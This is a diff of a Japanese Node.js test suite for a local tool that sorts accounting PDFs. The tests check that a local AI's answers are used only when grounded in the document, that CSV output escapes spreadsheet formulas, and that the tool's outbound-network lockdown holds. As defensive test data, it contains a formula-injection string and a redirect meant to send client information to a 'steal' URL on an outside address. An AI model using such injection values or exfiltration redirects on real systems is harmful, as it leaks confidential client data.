@@ -37,14 +37,39 @@ test('プログラム全体で、外部への通信が止まる', async () => {
 // ---------------- AIの答えの検証 ----------------
 const MEMO = '残高一覧(月末時点)\n宛先:さくら建設 経理ご担当\n令和7年5月分\n売上高 1,000,000';
 
-test('ルールで読めない書類種別を、根拠付きのAIの答えで補う', () => {
+test('目印の無い表題をAIが推定したときは、入力済みにして人の確認に回す', () => {
   const rule = X.extract(MEMO, { clients: CLIENTS });
   assert.strictEqual(rule.status, '要確認');
   const ai = { docType: '月次試算表', docTypeEvidence: '残高一覧(月末時点)', clientCode: '10001', clientEvidence: 'さくら建設 経理ご担当', periodStart: '2025-05-01', periodEnd: '2025-05-31', periodEvidence: '令和7年5月分' };
   const r = AI.merge(rule, ai, MEMO, CLIENTS);
-  assert.strictEqual(r.status, 'OK', r.issues.join(' / '));
-  assert.deepStrictEqual(r.aiFilled, ['書類種別']);
-  assert.strictEqual(r.suggestedFileName, '10001_株式会社さくら建設_2025-05_月次試算表.pdf');
+  assert.strictEqual(r.status, '要確認');               // 自動では仕分けない
+  assert.strictEqual(r.docType, '月次試算表');          // ただし入力済み
+  assert.deepStrictEqual(r.aiFilled, ['書類種別(推定)']);
+  assert.match(r.issues.join(), /推定を入力しました/);
+});
+
+test('目印の言葉を根拠にしたAIの答えは、自動で使う', () => {
+  const text = '経営資料(試算表)\n宛先:さくら建設 経理ご担当\n令和7年5月分';
+  const v = AI.verifyAI({ docType: '月次試算表', docTypeEvidence: '経営資料(試算表)', clientCode: '10001', clientEvidence: '顧問先コード:10001' }, text + '\n顧問先コード:10001', CLIENTS);
+  assert.strictEqual(v.ok.docType, '月次試算表');
+  assert.strictEqual(v.ok.client.code, '10001');
+});
+
+test('点検で見つかった、でたらめな根拠のすり抜けを防ぐ', () => {
+  const text = '経営資料\n顧問先名:株式会社さくら建設\n売上高 1,000,000';
+  const clients = [{ code: '1', name: '株式会社さくら建設' }, { code: '3', name: '合同会社ひかりデザイン' }];
+  // 期間:日付の無い「売上高」を根拠に、2023年1月と答える → 使わない
+  let v = AI.verifyAI({ periodEnd: '2023-01-31', periodEvidence: '売上高' }, text, clients);
+  assert.ok(!v.ok.period);
+  // 書類種別:目印の無い「顧問先」を根拠に → 自動では使わない(推定どまり)
+  v = AI.verifyAI({ docType: '法人税申告書', docTypeEvidence: '顧問先' }, text, clients);
+  assert.ok(!v.ok.docType);
+  // 顧問先コード「3」が「令和7年3月分」の数字に一致しない
+  v = AI.verifyAI({ clientCode: '3', clientEvidence: '令和7年3月分' }, '令和7年3月分\nメモ', clients);
+  assert.ok(!v.ok.client);
+  // 推定だけで埋まった書類は、自動では仕分けない
+  const r = AI.merge(X.extract(text, { clients }), { docType: '法人税申告書', docTypeEvidence: '経営資料', periodEnd: '2023-01-31', periodEvidence: '売上高' }, text, clients);
+  assert.strictEqual(r.status, '要確認');
 });
 
 test('AIのでっち上げ(PDFに無い根拠・マスタに無い顧問先・候補に無い種別)は使わない', () => {
@@ -159,4 +184,56 @@ test('ローカルAIが起動していなくても、ルールだけで動き続
   const { rows } = await run({ config: path.join(dir, 'config.json'), log: (m) => lines.push(m) });
   assert.match(lines[0], /使えません/);
   assert.strictEqual(rows[0][1], 'OK');
+});
+
+test('移動できないファイルがあっても、他のファイルの記録は失われない', async () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sorter-'));
+  fs.mkdirSync(path.join(dir, 'in'));
+  for (const f of ['scan_0001.pdf', 'scan_0002.pdf', 'scan_0003.pdf']) fs.copyFileSync(path.join(ROOT, 'demo', 'samples', f), path.join(dir, 'in', f));
+  fs.copyFileSync(path.join(ROOT, 'test', 'fixtures', '顧問先マスタ.csv'), path.join(dir, 'master.csv'));
+  fs.writeFileSync(path.join(dir, 'config.json'), JSON.stringify({ inbox: 'in', archive: 'out', clients: 'master.csv', ai: { mode: 'off' } }));
+  // scan_0002.pdf だけ「開いたまま」で動かせない状態をまねる
+  const orig = fs.renameSync;
+  fs.renameSync = function (from, to) {
+    if (/scan_0002\.pdf$/.test(from)) { const e = new Error('busy'); e.code = 'EBUSY'; throw e; }
+    return orig.apply(this, arguments);
+  };
+  try {
+    const { rows } = await run({ config: path.join(dir, 'config.json'), apply: true, log: () => {} });
+    assert.deepStrictEqual(rows.map((r) => r[1]), ['OK', 'エラー', 'OK']);
+    assert.ok(fs.existsSync(path.join(dir, 'in', 'scan_0002.pdf')), '動かせなかったファイルは受付フォルダに残る');
+    const csv = fs.readFileSync(path.join(dir, 'out', '書類一覧.csv'), 'utf8');
+    assert.strictEqual(csv.trim().split('\n').length, 4, '見出し+3件が記録される');
+    assert.match(csv, /EBUSY/);
+  } finally { fs.renameSync = orig; }
+});
+
+test('書類から読んだ文字が、Excelで数式として動かない', () => {
+  const { toCsvLine } = require('../local/sorter.js');
+  const line = toCsvLine(['=HYPERLINK("http://x.example/")', '+1', '@SUM(A1)', -1500, '-1500', '株式会社さくら建設']);
+  assert.ok(line.startsWith('"\'=HYPERLINK'), line);
+  assert.match(line, /,'\+1,'@SUM\(A1\),-1500,-1500,株式会社さくら建設$/);
+});
+
+test('点検で見つかった、通信制限のすり抜けを防ぐ', async () => {
+  lockdownNetwork();
+  // 2つ目の引数で外部を指定する
+  assert.throws(() => require('http').request('http://127.0.0.1/', { hostname: '192.0.2.2' }), /外部への通信は禁止/);
+  // いちばん下の接続で外部を指定する
+  assert.throws(() => require('net').connect(80, '192.0.2.2'), /外部への通信は禁止/);
+  assert.throws(() => require('net').connect({ host: '192.0.2.2', port: 80 }), /外部への通信は禁止/);
+  assert.throws(() => require('tls').connect({ host: '192.0.2.2', port: 443 }), /外部への通信は禁止/);
+  // このパソコン宛てのサーバーが、外部へリダイレクトしても従わない
+  const server = http.createServer((req, res) => { res.writeHead(307, { Location: 'http://192.0.2.2/steal' }); res.end(); });
+  await new Promise((r) => server.listen(0, '127.0.0.1', r));
+  try {
+    await assert.rejects(fetch(`http://127.0.0.1:${server.address().port}/`, { method: 'POST', body: '顧問先の情報' }));
+  } finally { server.close(); }
+  // このパソコン宛ての通常の通信は、今まで通りできる
+  const ok = http.createServer((req, res) => res.end('ok'));
+  await new Promise((r) => ok.listen(0, '127.0.0.1', r));
+  try {
+    const res = await fetch(`http://127.0.0.1:${ok.address().port}/`);
+    assert.strictEqual(await res.text(), 'ok');
+  } finally { ok.close(); }
 });
